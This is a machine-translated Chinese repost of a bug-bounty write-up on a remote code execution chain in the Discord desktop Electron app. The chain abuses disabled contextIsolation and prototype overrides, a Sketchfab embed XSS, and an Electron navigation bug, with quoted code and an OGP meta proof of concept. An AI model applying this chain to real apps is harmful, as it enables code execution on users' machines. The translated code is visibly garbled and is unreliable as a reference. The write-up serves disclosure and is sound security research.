<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>不和谐桌面应用RCE</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">不和谐桌面应用RCE</h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2020-10-19 11:13:53</div><div class="story_img_container"><a href="http://img2.diglog.com/img/2020/10/6dddf8c7cfbeffe72892f08e2144db11.jpeg"><img src="http://img2.diglog.com/img/2020/10/6dddf8c7cfbeffe72892f08e2144db11.jpeg" class="img-fluid my_story_img" onerror="this.style.display='none'"></a></div><div class="page_narrow text-break page_content"><p>几个月前，我在Discorde桌面应用程序中发现了一个远程代码执行问题，并通过他们的Bug Bounty Program报告了这一问题。</p><p>我发现的RCE非常有趣，因为它是通过组合多个bug来实现的。在这篇文章中，我想和大家分享一下细节。</p><p>我有点想找出Electron应用程序的漏洞，所以我在寻找一个为Electron应用程序支付赏金的漏洞赏金程序，但我发现了不和谐之处。此外，我是一个不和谐的用户，只是想检查一下我正在使用的应用程序是否安全，所以我决定进行调查。</p><p>当我测试Electron应用程序时，我总是首先检查BrowserWindow API的选项，该API用于创建浏览器窗口。通过检查它，我想到了当可以在呈现器上执行任意JavaScript时如何实现RCE。</p><p>Discorde的Electron应用程序不是一个开源项目，但Electron的JavaScript代码是以asar格式保存在本地的，我只需解压缩它就可以阅读它。</p><p>Const mainWindowOptions={Title：&#39；discord&#39；，backmentColor：getBackround Color()，inwidth：default_width，高度：default_width，inminWidth：min_width，inminHeight：min_Height，透明：false，frame：false，size able：true，inshow：isVisible，.webPreferences：{1，0，blinkFeature：&#39；EnumerateDevices，AudioOutputDevices&#39；，nodeIntegration：false，preload：_path2.default.join(__dirname，&39；mainScreenPreload.js&39；)，nativeWindowOpen：true，enableRemoteModule：false，拼写检查：true}}；</p><p>这里我们要检查的重要选项特别是nodeIntegration和contextIsolation。从上面的代码中，我发现在不一致的主窗口中，nodeIntegration选项被设置为false，contextIsolation选项被设置为false(所用版本的默认值)。</p><p>如果nodeIntegration设置为true，则网页的JavaScript只需调用Required()即可轻松使用Node.js功能。例如，在Windows上执行计算应用程序的方式是：</p><p>此时，nodeIntegration被设置为false，因此我不能通过直接调用request()来使用Node.js特性。</p><p>但是，仍然有可能访问Node.js功能。另一个重要选项contextIsolation被设置为false。如果您希望在应用程序上消除RCE的可能性，则不应将此选项设置为False。</p><p>如果禁用contextIsolation，网页的JavaScript可能会影响Electron的内部JavaScript代码在呈现器和预加载脚本上的执行(在下文中，这些JavaScript将称为网页外的JavaScript代码)。*例如，如果使用网页JavaScript中的另一个函数覆盖JavaScript内置方法之一Array.Prototype.Join，则调用Join时，网页外的JavaScript代码也将使用覆盖函数。</p><p>此行为很危险，因为Electron允许网页外的JavaScript代码使用Node.js功能，而不考虑nodeIntegration选项，并且通过从网页中被覆盖的函数干扰它们，即使将nodeIntegration设置为false，也可能实现RCE。</p><p>顺便说一句，这样的把戏以前是不为人所知的。它是在2016年由Cure53在一次五角星测试中首次发现的，我也加入了这个组织。之后，我们将其报告给电子团队，并介绍了contextIsolation。</p><p>最近，那份最新的报告发表了。如果您感兴趣，可以通过以下链接阅读：</p><p>ContextIsolation在网页和网页外部的JavaScript代码之间引入了独立的上下文，因此每个代码的JavaScript执行不会影响每个代码。这是消除RCE可能性的必要措施，但这一次它在不和谐中被禁用。</p><p>现在我发现contextIsolation被禁用了，所以我开始寻找一个地方，在那里我可以通过干扰网页外部的JavaScript代码来执行任意代码。</p><p>通常，当我在Electron的Pentest中为RCE创建PoC时，我首先尝试通过在渲染器上使用Electron的内部JavaScript代码来实现RCE。这是因为电子在渲染器上的内部JavaScript代码可以在任何电子应用程序中执行，所以基本上我可以重用相同的代码来实现RCE，而且很容易。</p><p>在我的幻灯片中，我介绍了RCE可以通过使用Electron在导航定时执行的代码来实现。这不仅可以从代码中获得，而且在某些地方也有这样代码。(我想在将来出版PoC的例子。)。</p><p>但是，根据使用的Electron的版本或设置的BrowserWindow选项，由于代码已更改或无法正确访问受影响的代码，有时通过Electron的代码的PoC无法正常工作。在这段时间内，它不起作用，所以我决定将目标更改为预加载脚本。</p><p>在检查预加载脚本时，我发现不一致会暴露该函数，从而允许通过DiscordNative.nativeModules.requireModule(&#39；MODULE-NAME&#39；)，将一些允许的模块调用到网页中。</p><p>在这里，我不能使用可以直接用于RCE的模块，例如Child_process模块，但是我找到了一段代码，其中可以通过覆盖JavaScript内置方法并干扰公开的模块的执行来实现RCE。</p><p>以下是PoC。当我从DevTools调用getGPUDriverVersions函数(该函数在称为&#34；discord_utils&#34；的模块中定义)并覆盖RegExp.Prototype.test和Array.Prototype.join时，我能够确认弹出Calc应用程序。</p><p>GetGPUDriverVersions函数尝试使用&#34；execa&#34；库执行程序，如下所示：</p><p>Module e.exports.getGPUDriverVersions=async()=&gt；{{如果(process.platform！==&#39；win32&#39；){{0}；返回{}；{{}}*const nvidiaSmiPath=`${process.env[&#39；ProgramW6432&#39；]}/NVIDIA公司/nvsmi/nvidia-smi.exe`；*try{nvidiaResult.nvidia=parseNvidiaSmiOutput(await execa(nvidiaSmiPath，[])；{nvidia=parsenvidiaSmiOutput(aWait execa(nvidiaSmiPath，[]))；**}catch(E){*Result.nvidia={error：e.toString()}；**}**返回结果；}；</p><p>通常，execa尝试执行在nvidiaSmiPath变量中指定的&#34；nvidia-smi.exe&#34；，但是，由于被覆盖的RegExp.Prototype.test和Array.Prototype.join，该参数在execa的内部处理中被替换为&#34；calc&#34；。</p><p>剩下的工作是找到一种在应用程序上执行JavaScript的方法。如果我能找到它，就能找到真正的RCE。</p><p>如上所述，我发现任意JavaScript执行可能会发生RCE，因此我试图查找XSS漏洞。这款应用程序支持自动链接或降价功能，但看起来不错。所以我把注意力转向了iframe嵌入功能。例如，iFrame Embedded是在发布YouTube URL时自动在聊天中显示视频播放器的功能。</p><p>当URL发布后，Discorde会尝试获取该URL的OGP信息，如果有OGP信息，它会在聊天中显示页面的标题、描述、缩略图、关联视频等。</p><p>不一致从OGP中提取视频URL，并且仅当该视频URL是被允许的域并且该URL实际上具有嵌入页面的URL格式时，该URL才被嵌入到IFRAME中。</p><p>我找不到关于iFrame中可以嵌入哪些服务的文档，所以我试图通过检查CSP的frame-src指令来获得提示。当时使用的CSP如下：</p><p>内容-安全-策略：[...]；帧源https://*.youtube.com https://*.twitch.tv https://open.spotify.com https://w.soundcloud.com https://sketchfab.com https://player.vimeo.com https://www.funimation.com https://twitter.com https://www.google.com/recaptcha/https://recaptcha.net/recaptcha/https://js.stripe.com https://assets.braintreegateway.com https://checkout.paypal.com https://*.watchanimeattheoffice.com。</p><p>显然，它们中的一些列出是为了允许IFRAME嵌入(例如YouTube、Twitch、Spotify)。我试图通过在OGP信息中逐个指定域名来检查URL是否可以嵌入到IFRAME中，并试图在嵌入的域名上找到XSS。经过一番尝试，我发现CSP中列出的域名之一的SketchFab.com可以嵌入到IFRAME中，并在Embed页面找到了XSS。“我当时并不知道Sketchfab，但它似乎是一个用户可以发布、买卖3D模型的平台。在3D模型的脚注中有一个简单的基于DOM的XSS。</p><p>下面是PoC，它具有精心编制的OGP。当我将这个URL发布到聊天中时，Sketchfab被嵌入到聊天的iframe中，在iframe上单击几下之后，任意JavaScript就会执行。</p><p>&lt；head&gt；meta charset=&#34；utf-8&#34；&gt；meta property=&#34；og：title&#34；rce demo&#34；&gt；meta property=&#34；rce demo&#34；&gt；meta property=&#34；[...]；&lt；meta property=&#34；og：Video：url&#34；content=&#34；https：//rce demo&34；&gt；[...]：&lt；meta property=&#34；https：//rce demo&#34；&lt；meta property=&#34；Meta property=&#34；og：video：type&#34；content=&#34；text/html&34；&gt；end；meta property=&#34；og：video：width&#34；content=&#34；1280&34；&gt；end=&#34；1280&34；&gt；meta property=&#34；og：video：Height&34；content=&#34；720&34；&lt；&head&gt；</p><p>好的，最后我找到了一个XSS，但是JavaScript仍然在IFRAME上执行。由于Electron不会将网页外的JavaScript代码加载到IFRAME中，因此即使我覆盖了IFRAME上的JavaScript内置方法，也无法干扰Node.js；关键部分。要实现RCE，我们需要走出iFrame并在顶级浏览上下文中执行JavaScript。这需要从IFRAME打开一个新窗口，或从IFRAME将顶部窗口导航到另一个URL。</p><p>我检查了相关代码，通过在主进程的代码中使用&#34；new-Window&#34；和&#34；will-Navigesp事件找到了限制导航的代码：</p><p>MainWindow.webContents.on(&#39；new-window&#39；，(e，windowURL，FrameName，Disposition，Options)=&gt；{WindowURL，Frame Name，Disposition，Options()；|if(frame Name.startsWith(Discord_Nampace)&amp；&amp；windowURL.startsWith(WebAPP_ENDPOINT)){，popoutWindows.openOrFocusWindow(e，windowURL，frame Name，Options)；**}Else}{_Electron.shell.openExternal(WindowURL)；**}})；[...]。MainWindow.webContents.on(&#39；will-navigate&#39；，(evt，url)=&gt；{#if(！inside AuthFlow&amp；&amp；！url.startsWith(WebAPP_ENDPOINT)){#；#}})；</p><p>我认为这段代码可以正确地阻止用户打开新窗口或导航顶部窗口。然而，我注意到了意想不到的行为。</p><p>我认为代码没有问题，但我尝试检查来自iframe的顶部导航是否已被阻止。然后，令人惊讶的是，导航并没有因为某种原因而被封锁。我原以为在导航发生之前，&#34；will-Naviges第#34；事件会捕捉到该尝试，并被brumentDefault()拒绝，但事实并非如此。</p><p>为了测试这一行为，我创建了一个小型电子应用程序。我发现，由于某些原因，从iFrame开始的顶部导航不会发出&#34；will-Navigesp事件。准确地说，如果顶部的原点和IFRAME的原点位于同一原点，则会发出该事件，但如果它位于不同的原点，则不会发出该事件。我不认为这种行为有合法的原因，所以我认为这是电子公司的缺陷，并决定稍后向电子公司团队报告。</p><p>在这个错误的帮助下，我能够绕过导航限制。我应该做的最后一件事就是使用IFRAME的XSS(如top.location=&#34；//l0.cm/discord_calc.html&#34；.)导航到包含RCE代码的页面。</p><p>通过这种方式，通过结合三个bug，我能够实现RCE，如下面的视频所示。</p><p>这些问题是通过不和谐的虫子赏金计划报告的。首先，Discorde团队禁用了Sketchfab嵌入，并采取了一种解决方法，通过将沙箱属性添加到IFrame来阻止从IFrame导航。过了一段时间后，启用了Context Isolation。现在，即使我可以在应用程序上执行任意JavaScript，RCE也不会通过被覆盖的JavaScript内置方法发生。我收到了5000美元作为这一发现的奖励。</p><p>Sketchfab上的XSS是通过Sketchfab的Bug Bounty程序报告的，并被Sketchfab开发者迅速修复。我得到300美元作为这一发现的奖励。</p><p>Will-Navise事件中的错误被报告为电子邮件安全团队的错误，并已修复为以下漏洞(cve-2020-15174)。</p><p>仅此而已。(就我个人而言，我喜欢外部页面的漏洞或电子邮件的漏洞，它们与应用程序本身的实现无关，导致了RCE：)</p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://mksben.l0.cm/2020/10/discord-desktop-rce.html">https://mksben.l0.cm/2020/10/discord-desktop-rce.html</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/应用/">#应用</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/desktop/">#desktop</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/iframe/">#iframe</a></button></div></div><div class="shadow p-3 mb-5 bg-white rounded clearfix"><div class="container"><div class="row"><div class="col-sm"><div><a target="_blank" href="/story/1029066.html"><img src="http://img2.diglog.com/img/2020/10/thumb_3e2260984b6b0a421811b27fca9fb2e6.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1029066.html">IPhone激光雷达背后的技术可能很快就会应用到汽车上</a></div><span class="my_story_list_date">2020-10-16 0:46</span></div><div class="col-sm"><div><a target="_blank" href="/story/1028459.html"><img src="http://img2.diglog.com/img/2020/10/thumb_f2d8841db311adb2e5e45859b13c6343.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1028459.html">随着美国人蜂拥至贝宝(PayPal)、Square和Zelle的支付应用，根据应用评论，欺诈率也在上升，通常几乎没有支持</a></div><span class="my_story_list_date">2020-10-13 20:29</span></div><div class="col-sm"><div><a target="_blank" href="/story/1028250.html"><img src="http://img2.diglog.com/img/2020/10/thumb_1a19830f6e036521ead5ddbd6f25b2b6.png" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1028250.html">格鲁伯谈“Windows上微软商店的10条原则”</a></div><span class="my_story_list_date">2020-10-12 17:51</span></div><div class="col-sm"><div><a target="_blank" href="/story/1028082.html"><img src="http://img2.diglog.com/img/2020/10/thumb_0ccb495e10c760f535079df9cbc870a0.jpg" class="img-fluid" onerror="this.style.display='none'"></a></div><div class="item_title"><a target="_blank" href="/story/1028082.html">
法官驳回史诗强制苹果将堡垒之夜带回应用商店的请求</a></div><span class="my_story_list_date">2020-10-11 17:0</span></div></div></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/谷歌/">#谷歌</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/工具/">#工具</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy;2012-2021 diglog.com </div></div></body></html>